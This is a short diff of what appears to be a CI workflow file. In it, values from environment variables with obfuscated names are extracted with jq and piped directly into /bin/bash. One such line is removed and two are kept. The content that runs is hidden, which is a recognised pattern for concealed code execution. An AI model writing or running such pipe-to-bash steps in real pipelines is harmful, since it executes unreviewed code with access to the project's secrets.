@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
           echo $gvb17733 | jq -r .e3 | /bin/bash
-          printf '%s' "$tynv4" | jq -r .hezso98 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
